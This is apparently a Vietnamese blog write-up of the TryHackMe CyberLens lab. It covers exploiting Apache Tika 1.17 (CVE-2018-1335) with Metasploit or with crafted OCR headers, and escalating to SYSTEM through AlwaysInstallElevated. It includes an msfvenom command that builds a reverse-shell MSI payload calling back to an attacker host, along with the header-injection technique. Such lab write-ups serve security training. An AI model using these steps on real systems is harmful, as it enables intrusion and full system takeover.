---
title: "TryHackMe - CyberLens Writeup"
published: 2026-05-18
tags: [TryHackMe, Writeup, Pentest, Windows, Privilege Escalation, CVE-2018-1335, AlwaysInstallElevated]
category: Writeups
description: Hướng dẫn chi tiết cách giải quyết máy CyberLens trên TryHackMe. Khai thác lỗ hổng CVE-2018-1335 trên Apache Tika để lấy Initial Access và leo thang đặc quyền thông qua cấu hình sai AlwaysInstallElevated trên Windows.
draft: true
image: /assets/data/cyberlens.png
---

## Giới thiệu
**CyberLens** là một cỗ máy (machine) trên TryHackMe tập trung vào việc khai thác một ứng dụng web server có tồn tại lỗ hổng, cụ thể là Apache Tika, và sau đó lợi dụng sự cấu hình sai (misconfiguration) của Windows registry để leo thang đặc quyền lên mức cao nhất.

## 1. Reconnaissance (Thu thập thông tin)

Chúng ta bắt đầu với việc rà quét cổng bằng công cụ Nmap để xem những dịch vụ nào đang chạy trên máy mục tiêu.

Nmap scan phát hiện nhiều cổng đang mở, bao gồm các dịch vụ phổ biến trên Windows:

![Nmap scan](/assets/data/cyberlens_2.png)

- Microsoft RPC (135/tcp)
- NetBIOS (139/tcp)
- Microsoft-DS (445/tcp)
- Remote Desktop Protocol (3389/tcp)
- Windows Remote Management (5985/tcp và 47001/tcp)
- Nhiều cổng RPC không xác định khác (49664/tcp đến 49670/tcp và 49677/tcp)

Đáng chú ý, có một máy chủ web chạy trên cổng **80** và một máy chủ web thứ hai chạy trên cổng **61777**.

### Khám phá dịch vụ Web
Khi truy cập trang web ở cổng 80, chúng ta thấy một trang web (one-pager).

![Trang web cổng 80](/assets/data/cyberlens_3.png)

Trang này có một biểu mẫu liên hệ nhưng qua thử nghiệm, không phát hiện lỗ hổng XSS (Cross-Site Scripting).
Cuộn xuống bên dưới, chúng ta thấy có một tính năng cho phép tải lên một hình ảnh để trích xuất dữ liệu metadata của nó.

![Upload metadata](/assets/data/cyberlens_4.png)

Các phương pháp tấn công phổ biến như: tải lên reverse shell, khai thác qua ImageMagick hay chèn shell qua metadata (bằng exiftool) đều không thành công.

Tuy nhiên, khi xem mã nguồn (source code) của trang web, chúng ta phát hiện một endpoint hướng tới cổng **61777**. Máy chủ ở cổng này đảm nhận chức năng trích xuất metadata.

![Mã nguồn trang web](/assets/data/cyberlens_5.png)

Truy cập trực tiếp vào cổng `61777` cho thấy trang index của Apache Tika với phiên bản **Apache Tika 1.17**.

![Apache Tika 1.17](/assets/data/cyberlens_6.png)

Tra cứu phiên bản này, ta phát hiện nó dính lỗ hổng **CVE-2018-1335**.

## 2. Initial Access - Shell as cyberlens

Lỗ hổng **CVE-2018-1335** là một lỗi thực thi mã từ xa (Remote Code Execution - RCE) trên Apache Tika. Kẻ tấn công có thể thực thi các đoạn mã tùy ý bằng cách gửi một HTTP request được tinh chỉnh đặc biệt, lợi dụng cách Tika xử lý quá trình OCR (Optical Character Recognition).

Chúng ta có thể khai thác nó qua các phương pháp sau:

### Phương pháp 1: Sử dụng Metasploit
Tìm kiếm lỗ hổng của Tika trên Metasploit, ta có sẵn module khai thác lệnh (command injection) phù hợp với phiên bản này.

![Metasploit module](/assets/data/cyberlens_7.png)

Cấu hình các tham số:
- Thiết lập `LHOST` (IP của máy tấn công)
- Thiết lập `RHOST` (IP của mục tiêu)
- Thiết lập `RPORT` (61777)

![Metasploit options](/assets/data/cyberlens_8.png)

Khởi chạy exploit, ta sẽ nhận được một reverse shell với quyền user `cyberlens`. 

![Reverse shell cyberlens](/assets/data/cyberlens_9.png)

Sau khi liệt kê thư mục bằng lệnh `tree /f`, ta có thể tìm thấy file `user.txt` (User Flag) trên màn hình Desktop của người dùng.

![User flag](/assets/data/cyberlens_10.png)

### Phương pháp 2: Sử dụng Script / Khai thác thủ công
Chúng ta có thể sử dụng script exploit viết bằng Python từ Rhino Security Labs.

![Python script](/assets/data/cyberlens_11.png)

Bên cạnh đó, việc khai thác thủ công có thể được thực hiện thông qua `curl` để gọi các process như `calc.exe`. Do giới hạn việc Java ProcessBuilder xử lý lệnh như một chuỗi (string) duy nhất chứ không nhận nhiều đối số, ta có một cách đi vòng (workaround) như sau:
Sử dụng header HTTP:
- `X-Tika-OCRTesseractPath: "cscript.exe"`
- `X-Tika-OCRLanguage: //E:Jscript`

Dữ liệu (data) được gửi lên máy chủ là mã Jscript hoặc VBS, tạo đối tượng WScript.Shell để kích hoạt Powershell reverse shell, giúp ta chiếm quyền kiểm soát máy mục tiêu.

*Bạn có thể truy cập `revshells.com` để tự tạo cho mình một câu lệnh PowerShell reverse shell tương ứng.*

![Bắt shell thủ công](/assets/data/cyberlens_12.png)

## 3. Privilege Escalation - Shell as NT AUTHORITY\SYSTEM

Với quyền user `cyberlens`, mục tiêu tiếp theo là leo thang đặc quyền lên `NT AUTHORITY\SYSTEM`.

Đầu tiên, ta tiến hành thu thập thông tin về hệ thống để tìm kiếm vector tấn công. Chúng ta có thể tải các script enumerate Windows như `WinPEAS`, `PowerUp` hoặc `PrivescCheck.ps1` lên máy mục tiêu.

Kiểm tra xem Windows Defender hay phần mềm chống virus nào đang chạy hay không:
```powershell
Get-MpComputerStatus
```
Lệnh trên cho thấy không có cơ chế bảo vệ nào đang chạy, giúp ta có thể thoải mái sử dụng các công cụ như `msfvenom` hoặc mã độc mà không sợ bị chặn.

Khi chạy file `PrivescCheck.ps1`:
```powershell
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
```

![PrivescCheck output](/assets/data/cyberlens_16.png)

Kết quả báo cáo phát hiện ra cấu hình sai: **AlwaysInstallElevated** đang được kích hoạt.
Tính năng `AlwaysInstallElevated` khi được bật cho phép bất kỳ user nào cũng có thể cài đặt các tệp `.msi` với quyền tối cao (`SYSTEM`).

Có thể kiểm tra lại điều này thông qua Registry:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Cách khai thác

Dựa trên misconfiguration này, chúng ta sẽ tạo ra một tệp MSI độc hại chứa payload reverse shell bằng `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_CỦA_BẠN> LPORT=443 -a x64 --platform Windows -f msi -o rev.msi
```

![Tạo payload với msfvenom](/assets/data/cyberlens_18.png)

Tải tệp `rev.msi` này lên máy nạn nhân, thiết lập listener trên cổng `443` ở máy tấn công, và sau đó khởi chạy tệp tin MSI. Quá trình cài đặt tệp msi sẽ tạo kết nối trả về lại với mức đặc quyền hệ thống.

Kết quả, ta có một reverse shell dưới quyền `NT AUTHORITY\SYSTEM`.

![NT AUTHORITY\SYSTEM shell](/assets/data/cyberlens_19.png)

Bạn có thể tiến đến thư mục `C:\Users\Administrator\Desktop\` và đọc file `admin.txt` để lấy cờ Root (Root flag).

## Tổng kết
CyberLens là một ví dụ tuyệt vời về việc áp dụng enumeration một cách thận trọng ở cả trước và sau khi xâm nhập vào một hệ thống mạng. Tìm hiểu kĩ về Apache Tika CVE-2018-1335 và misconfiguration AlwaysInstallElevated trên Windows là những bài học kỹ năng quan trọng mà bất kỳ người kiểm tra bảo mật (pentester) nào cũng cần nắm vững.
